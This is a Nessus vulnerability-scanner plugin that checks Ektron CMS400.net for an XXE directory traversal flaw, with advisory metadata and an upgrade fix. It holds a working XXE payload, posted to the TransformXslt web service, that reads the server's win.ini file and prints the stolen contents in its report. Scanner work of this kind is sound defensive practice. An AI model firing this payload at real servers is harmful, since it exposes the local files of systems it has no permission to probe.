#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(46200);
  script_version("$Revision: 1.7 $");
  script_cvs_date("$Date: 2015/09/24 21:08:39 $");

  script_bugtraq_id(39679);
  script_xref(name:"Secunia", value:"39547");

  script_name(english:"Ektron CMS400.net TransformXslt Web Service Directory Traversal");
  script_summary(english:"Attempts to retrieve a local file");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server has an application that is susceptible to a
directory traversal attack.");
  script_set_attribute(attribute:"description", value:
"The installed version of Ektron CMS400.net ships with a web service
that processes untrusted XML data and could allow an attacker to
perform XML External Entity (XXE) attacks.

Nessus was able to exploit this issue by sending a specially crafted
request to the 'TransformXslt' web service, and retrieve a local
file." );

  script_set_attribute(attribute:"see_also", value:"http://www.westpoint.ltd.uk/advisories/wp-09-0008.txt");
  script_set_attribute(attribute:"see_also", value:"http://dev.ektron.com/forum.aspx?g=posts&t=31005" );
  script_set_attribute(attribute:"see_also", value:"http://dev.ektron.com/cms400releasenotes.aspx#766sp5");
  script_set_attribute(attribute:"solution", value:"Upgrade to Ektron CMS400.NET 7.66 SP5 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2009/10/06");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/04/06"); 
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/04/30");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2015 Tenable Network Security, Inc.");

  script_dependencies("ektron_cms400_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/cms400", "www/ASP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80,asp:TRUE);

install = get_install_from_kb(appname:'cms400', port:port,exit_on_fail:TRUE);
dir = install['dir'];

file = "../../win.ini";

exploit = 'InputXML=&InputXSLT=' +
          '<?xml version="1.0"?>' +
          '<!DOCTYPE nessus [ <!ENTITY nessus SYSTEM "' + file + '">]>'+
          '<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0"> '+
          '<xsl:template match="/"> %26nessus; </xsl:template> '+
          '</xsl:stylesheet>';

url = dir + '/WorkArea/ServerControlWS.asmx/TransformXslt';

res = http_send_recv3(
        method:"GET",
        item:url,
        port:port,
        exit_on_fail:TRUE);

# If the TransformXslt web service exists, we should see an error

if("Missing parameter" >< res[2])
{
  # Now exploit the issue....
  res = http_send_recv3(
        method:"POST",
        item:url,
        port:port,
        add_headers: make_array(
          "Content-Type", "application/x-www-form-urlencoded",
          "Content-Length",strlen(exploit)),
        data:  exploit,
        exit_on_fail:TRUE);

  if("; for 16-bit app support" >< res[2])
  {
    if(report_verbosity > 0)
    {
      req = http_last_sent_request();
      report = '\n' +
        "Nessus was able to verify this issue by sending the following POST request :" + '\n\n' +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
        req + '\n' +
        crap(data:"-" , length:30) +  " snip " + crap(data:"-", length:30) + '\n' ;

      if (report_verbosity > 1)
      {
        # <string xmlns="http://www.ektron.com/CMS400/Webservice"> ; for 16-bit app support
        output = strstr(res[2], '<string xmlns="http://www.ektron.com/CMS400/Webservice"> ; for 16-bit app support') -
                 '<string xmlns="http://www.ektron.com/CMS400/Webservice"> ';
        output = output - strstr(output,'</string>');

       report += '\n' +
         "Here are the contents : "+ '\n\n' +
         crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
         output + '\n' +
         crap(data:"-" , length:30) +  " snip " + crap(data:"-", length:30) + '\n' ;
      }
      security_warning(port:port,extra:report);
    }
    else
      security_warning(port);
  }
  else
    exit(0,"The Ektron CMS400.NET install at "+ build_url(port:port, qs:dir) + " is not affected.");
}
exit(0,"The TransformXslt web service is not available for the Ektron CMS400.NET install at "+ build_url(port:port, qs:dir)+".");

